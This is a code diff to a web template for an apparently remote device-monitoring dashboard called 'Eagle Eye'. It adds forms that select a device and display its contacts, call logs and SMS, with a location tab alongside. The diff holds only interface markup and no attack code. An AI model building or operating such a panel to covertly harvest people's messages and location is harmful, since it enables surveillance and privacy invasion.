@@ -4,6 +4,7 @@
 {{super()}}
 <link rel="stylesheet" type="text/css" href="{{url_for('static', filename='headerBar.css')}}">
 <link rel="stylesheet" type="text/css" href="{{url_for('static', filename='navSide.css')}}">
+<link rel="stylesheet" type="text/css" href="{{url_for('static', filename='structures.css')}}">
 {% endblock %}
 
 {% block title %}
@@ -57,13 +58,61 @@ Eagle Eye | device data
         <section>
             <div class="tab-content">
                 <div class="tab-pane fade in active" role="tabpanel" id="readContacts">
-                    <h1>READ CONTACTS</h1>
+                    <form class="col-sm-4">
+                        <div class="form-group">
+                          <label for="sel1">Select Device:</label>
+                          <select class="form-control" id="sel1">
+                            {% for row in range(count) %}
+                              <option>{{ devsId[row][0] }}</option>
+                            {% endfor %}
+                          </select>
+                        </div>
+                        <input type="submit" class="btn btn-primary" value="Submit">
+                    </form>
+                    <div class="textareas col-sm-6">
+                        <label for="contactsTextarea"><strong>Device Contacts: </strong></label>
+                        <textarea class="form-control" id="contactsTextarea" rows="15" readonly></textarea>
+                        <br>
+                        <input type="button" class="btn btn-primary" value="Save to File">
+                    </div>
                 </div>
                 <div class="tab-pane fade" role="tabpanel" id="readCallLogs">
-                    <h1>READ CALL LOGS</h1>
+                    <form class="col-sm-4">
+                        <div class="form-group">
+                          <label for="sel2">Select Device:</label>
+                          <select class="form-control" id="sel2">
+                            {% for row in range(count) %}
+                              <option>{{ devsId[row][0] }}</option>
+                            {% endfor %}
+                          </select>
+                        </div>
+                        <input type="submit" class="btn btn-primary" value="Submit">
+                    </form>
+                    <div class="textareas col-sm-6">
+                        <label for="callLogTextarea"><strong>Device Calls Log: </strong></label>
+                        <textarea class="form-control" id="callLogTextarea" rows="15" readonly></textarea>
+                        <br>
+                        <input type="button" class="btn btn-primary" value="Save to File">
+                    </div>
                 </div>
                 <div class="tab-pane fade" role="tabpanel" id="readSms">
-                    <h1>READ SMS</h1>
+                    <form class="col-sm-4">
+                        <div class="form-group">
+                          <label for="sel3">Select Device:</label>
+                          <select class="form-control" id="sel3">
+                            {% for row in range(count) %}
+                              <option>{{ devsId[row][0] }}</option>
+                            {% endfor %}
+                          </select>
+                        </div>
+                        <input type="submit" class="btn btn-primary" value="Submit">
+                    </form>
+                    <div class="textareas col-sm-6">
+                        <label for="smsTextarea"><strong>Device SMS: </strong></label>
+                        <textarea class="form-control" id="smsTextarea" rows="15" readonly></textarea>
+                        <br>
+                        <input type="button" class="btn btn-primary" value="Save to File">
+                    </div>
                 </div>
                 <div class="tab-pane fade" role="tabpanel" id="currentLocation">
                     <h1>GET CURRENT LOCATION</h1>
